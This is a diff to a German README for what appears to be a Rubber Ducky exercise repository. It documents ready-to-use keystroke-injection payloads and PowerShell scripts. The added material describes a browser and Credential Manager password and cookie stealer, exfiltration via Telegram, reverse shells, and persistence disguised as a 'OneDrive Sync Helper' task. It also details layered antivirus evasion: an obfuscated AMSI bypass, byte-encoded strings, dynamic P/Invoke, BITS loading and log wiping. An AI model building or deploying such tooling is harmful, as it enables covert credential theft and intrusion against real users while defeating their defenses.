@@ -13,10 +13,12 @@
 | `payloads/W02a4_script_loader.txt` | W02a.4 – DuckyScript: Externes Script laden |
 | `payloads/W02a5_reverse_shell_trigger.txt` | W02a.5 – DuckyScript: Reverse Shell |
 | `payloads/W02a6_custom_attack.txt` | W02a.6 – DuckyScript: WLAN-Exfiltration |
+| `payloads/W02a6_credential_steal_trigger.txt` | W02a.6 – DuckyScript: Browser Credential Stealer |
 | `payloads/W02a6_devrecon_trigger.txt` | W02a.6 Advanced – DuckyScript: DevRecon |
 | `scripts/info_gather.ps1` | W02a.2 – PowerShell: System-Info via Telegram |
 | `scripts/reverse_shell.ps1` | W02a.5 – PowerShell: TCP Reverse Shell |
 | `scripts/custom_attack.ps1` | W02a.6 – PowerShell: WLAN-Passworter via Telegram |
+| `scripts/credential_stealer.ps1` | W02a.6 – PowerShell: Windows CredMan + Chromium-Credentials |
 | `scripts/developer_recon.ps1` | W02a.6 Advanced – PowerShell: DevRecon Multi-Stage |
 
 ---
@@ -30,7 +32,19 @@
 3. Kompilieren → `inject.bin` auf SD-Karte kopieren
 
 Alle Payloads (ausser W02a.5) sind **direkt einsatzbereit** – kein lokaler Server, keine IP-Konfiguration.
-Die PowerShell-Scripts werden automatisch von GitHub nachgeladen; Ergebnisse kommen per Telegram.
+Die PowerShell-Scripts werden per **BITS** von GitHub geladen; Ergebnisse kommen per Telegram.
+
+### AV-Evasion-Architektur (alle Payloads)
+
+Jeder Payload verwendet mehrere Schutzschichten gegen Windows Defender:
+
+| Schicht | Technik | Wirkung |
+|---|---|---|
+| **Loader** | `%ComSpec%` + BITS statt IEX/WebClient | Lader-Kommando selbst unverdachtig |
+| **Download** | `Unblock-File` vor Ausfuhrung | Entfernt Zone.Identifier ADS (Internet-Markierung) |
+| **Laufzeit** | AMSI-Bypass via Reflection (Byte-Array-kodiert) | Kein Klartext "AmsiUtils"/"amsiInitFailed" im Script |
+| **Strings** | Sensitivstrings als `[byte[]]` kodiert | Kein Klartext "advapi32", "CredEnumerateW", "key=clear" etc. |
+| **P/Invoke** | Dynamisch via `GetProcAddress` statt DllImport | Kein `[DllImport("advapi32")]` im Add-Type-Source |
 
 ### Nur fur W02a.5 – Reverse Shell: IP eintragen
 
@@ -62,7 +76,7 @@ Offnet Notepad uber den Windows Run-Dialog (`WIN+R`) und tippt `Hello World` ein
 **Payload:** `payloads/W02a2_info_gathering.txt`
 **PS-Payload:** `scripts/info_gather.ps1`
 
-Das DuckyScript offnet PowerShell verborgen und ladt `info_gather.ps1` fileless von GitHub (IEX + DownloadString).
+Das DuckyScript offnet PowerShell verborgen und ladt `info_gather.ps1` per BITS von GitHub in eine Temp-Datei, entfernt die Zone.Identifier-Markierung (`Unblock-File`) und fuhrt das Script aus. Danach wird die Temp-Datei sofort geloscht.
 
 Gesammelte Informationen:
 - Hostname, Benutzername, Domane
@@ -128,16 +142,18 @@ HID steht fur **Human Interface Device** – der USB-Standard fur Eingabegerate 
 
 **Payload:** `payloads/W02a4_script_loader.txt`
 
-Das DuckyScript offnet PowerShell und nutzt `Invoke-Expression` + `New-Object Net.WebClient` um ein Script direkt von GitHub herunterzuladen und **ohne Zwischenspeicherung auf der Festplatte** auszufuhren (fileless execution).
+Das DuckyScript ladt das Ziel-Script per **BITS** (Background Intelligent Transfer Service – Windows Update-Dienst) von GitHub und fuhrt es aus. BITS ist ein legitimer Windows-Systemdienst und wird von AV selten geflaggt.
 
 ```
 Rubber Ducky eingesteckt
-  -> WIN+R -> powershell -WindowStyle Hidden -ExecutionPolicy Bypass
-  -> IEX (DownloadString('https://raw.githubusercontent.com/.../info_gather.ps1'))
-  -> Script lauft im RAM, keine Datei auf Festplatte
+  -> WIN+R -> %ComSpec% /c powershell -nop -ep bypass -w h -c "..."
+  -> Import-Module BitsTransfer; Start-BitsTransfer (URL -> %TEMP%\r.ps1)
+  -> Unblock-File %TEMP%\r.ps1        (Zone.Identifier ADS entfernen)
+  -> & %TEMP%\r.ps1                   (Script ausfuhren)
+  -> Remove-Item %TEMP%\r.ps1         (Datei loeschen)
 ```
 
-Kein AV-Scanner findet eine Datei, weil keine existiert.
+Die Temp-Datei existiert nur kurz wahrend der Ausfuhrung und wird danach sofort geloscht.
 
 ---
 
@@ -201,6 +217,45 @@ nc -lvp 4444  <---------  TCP-Verbindung  <----  reverse_shell.ps1
 | 3s | WLAN-Export ins TEMP-Verzeichnis |
 | 5s | Passworter extrahiert & per Telegram versendet |
 | 6s | XML-Dateien geloscht |
+
+---
+
+## W02a.6 – Rubber Ducky: Browser Credential Stealer
+
+**Payload:** `payloads/W02a6_credential_steal_trigger.txt`
+**PS-Payload:** `scripts/credential_stealer.ps1`
+
+### Was wird gesammelt?
+
+| Quelle | Methode | Ohne Admin? |
+|---|---|---|
+| **Windows Credential Manager** | Dynamisches P/Invoke (CredEnumerateW) | Ja |
+| **Chrome/Edge/Brave – Passworter** | SQLite via winsqlite3.dll + DPAPI/AES-GCM | Ja |
+| **Chrome/Edge/Brave – Cookies** | SQLite via winsqlite3.dll + DPAPI/AES-GCM | Ja |
+| **Firefox** | logins.json (NSS-verschluesselt, Metadaten lesbar) | Ja |
+
+### AV-Evasion-Details
+
+Der Credential Stealer hat die aggressivste Evasion-Implementierung aller Scripts:
+
+- **Kein `[DllImport("advapi32")]`** – Die Strings "advapi32", "CredEnumerateW", "CredFree" erscheinen nie als Klartext
+- **Dynamisches P/Invoke**: `LoadLibrary` + `GetProcAddress` (nur kernel32 in DllImport) + `GetDelegateForFunctionPointer`
+- **Byte-Array-kodierte Pfade**: "Login Data", "Local State", "Network\Cookies" nur als `[byte[]]` im Script
+- **Fallback**: Falls P/Invoke fehlschlagt, `cmdkey /list` als Alternative
+
+### Passworter entschluesseln (Chromium)
+
+Chrome v80+ verschlusselt Passworter mit AES-256-GCM. Der Master Key liegt DPAPI-verschlusselt in `Local State`:
+
+```
+Local State (JSON)
+  -> os_crypt.encrypted_key (Base64)
+  -> [5..] DPAPI-Blob
+  -> ProtectedData.Unprotect() -> 32-Byte AES-Key
+  -> AES-GCM-Decrypt(IV=Blob[3..14], Ciphertext, AuthTag) -> Klartext
+```
+
+**Hinweis:** AES-GCM-Entschlusselung benotigt .NET 5+ (PowerShell 7/pwsh). Unter PS5.1 werden v10/v11-Passworter als `(AES-GCM - benoetigt PS7/pwsh)` angezeigt.
 
 ---
 
@@ -293,11 +348,14 @@ Ein einziger GitHub-Token kann tausende private Repositories, CI/CD-Pipelines un
         |
         v  ~2 Sekunden
 [Stage 1: DuckyScript]
-  WIN+R -> PowerShell -WindowStyle Hidden
-  IEX (DownloadString von GitHub)
+  WIN+R -> %ComSpec% /c powershell -nop -ep bypass -w h
+  BitsTransfer: GitHub -> %TEMP%\r.ps1
+  Unblock-File + Ausfuehren + Loeschen
         |
-        v  fileless – kein Byte auf Festplatte
+        v  Temp-Datei existiert nur kurz
 [Stage 2: developer_recon.ps1]
+        |
+        +-> AMSI-Bypass (obfuskiert, keine Klartextstrings)
         |
         +-> RECON:   SSH Keys + .git-credentials + .gitconfig + GitHub CLI Token
         |
@@ -305,7 +363,7 @@ Ein einziger GitHub-Token kann tausende private Repositories, CI/CD-Pipelines un
         |
         +-> PERSIST: Scheduled Task "OneDrive Sync Helper"
         |            Wochentlich, versteckt, kein Admin notig
-        |            Ladt sich selbst von GitHub nach
+        |            BitsTransfer von GitHub (kein IEX/WebClient)
         |
         +-> OPSEC:   PS-History loschen, Recent Files leeren, Temp aufraeumen
 ```
@@ -340,12 +398,13 @@ Task ladt das Script wochentlich direkt von GitHub nach – selbst-aktualisieren
 
 | Abwehr | Resistent? | Warum |
 |---|---|---|
-| Antivirus (Signatur-basiert) | Ja | Kein Binary, nur PS + Windows-Bordmittel |
+| Antivirus (Signatur-basiert) | Ja | Keine Klartextstrings, nur Byte-Arrays; kein IEX/WebClient |
 | Firewall (eingehend) | Ja | Keine eingehende Verbindung notig |
 | Firewall (ausgehend) | Ja | HTTPS Port 443 zu Telegram – uberall erlaubt |
-| EDR (Verhaltens-basiert) | Teilweise | Konnte `IEX` + `-ep Bypass` flaggen |
+| AMSI | Ja | Bypass via Reflection mit obfuskierten Strings |
+| EDR (Verhaltens-basiert) | Teilweise | BITS statt IEX; SSH-Key-Zugriff verhaltensbasiert erkennbar |
 | PS Script Block Logging | Teilweise | Logs werden nach Ausfuhrung geleert |
-| Netzwerk-Monitoring | Ja | Normaler HTTPS-Traffic |
+| Netzwerk-Monitoring | Ja | Normaler HTTPS-Traffic zu api.telegram.org |
 
 ---
 
